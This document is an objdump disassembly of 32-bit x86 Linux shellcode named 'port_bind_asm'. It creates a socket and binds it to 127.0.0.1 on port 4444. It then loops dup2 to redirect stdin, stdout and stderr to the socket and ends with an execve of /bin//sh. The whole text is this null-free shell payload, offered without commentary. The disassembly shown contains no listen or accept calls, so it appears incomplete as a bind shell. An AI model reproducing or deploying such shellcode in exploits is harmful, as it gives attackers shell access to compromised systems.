
port_bind_asm.o:     file format elf32-i386


Disassembly of section .text:

00000000 <_start>:
   0:	31 c0                	xor    %eax,%eax
   2:	50                   	push   %eax
   3:	6a 01                	push   $0x1
   5:	6a 02                	push   $0x2
   7:	89 e1                	mov    %esp,%ecx
   9:	31 c0                	xor    %eax,%eax
   b:	b0 66                	mov    $0x66,%al
   d:	31 db                	xor    %ebx,%ebx
   f:	b3 01                	mov    $0x1,%bl
  11:	cd 80                	int    $0x80
  13:	96                   	xchg   %eax,%esi
  14:	c6 04 24 7f          	movb   $0x7f,(%esp)
  18:	c6 44 24 01 00       	movb   $0x0,0x1(%esp)
  1d:	c6 44 24 02 00       	movb   $0x0,0x2(%esp)
  22:	c6 44 24 03 01       	movb   $0x1,0x3(%esp)
  27:	66 68 11 5c          	pushw  $0x5c11
  2b:	66 6a 02             	pushw  $0x2
  2e:	89 e1                	mov    %esp,%ecx
  30:	6a 10                	push   $0x10
  32:	51                   	push   %ecx
  33:	56                   	push   %esi
  34:	89 e1                	mov    %esp,%ecx
  36:	43                   	inc    %ebx
  37:	31 c0                	xor    %eax,%eax
  39:	b0 66                	mov    $0x66,%al
  3b:	cd 80                	int    $0x80
  3d:	89 f3                	mov    %esi,%ebx
  3f:	31 c9                	xor    %ecx,%ecx
  41:	b1 03                	mov    $0x3,%cl

00000043 <dupin>:
  43:	31 c0                	xor    %eax,%eax
  45:	b0 3f                	mov    $0x3f,%al
  47:	fe c9                	dec    %cl
  49:	cd 80                	int    $0x80
  4b:	75 f6                	jne    43 <dupin>
  4d:	31 c0                	xor    %eax,%eax
  4f:	50                   	push   %eax
  50:	68 6e 2f 73 68       	push   $0x68732f6e
  55:	68 2f 2f 62 69       	push   $0x69622f2f
  5a:	89 e3                	mov    %esp,%ebx
  5c:	50                   	push   %eax
  5d:	53                   	push   %ebx
  5e:	89 e1                	mov    %esp,%ecx
  60:	31 d2                	xor    %edx,%edx
  62:	b0 0b                	mov    $0xb,%al
  64:	cd 80                	int    $0x80
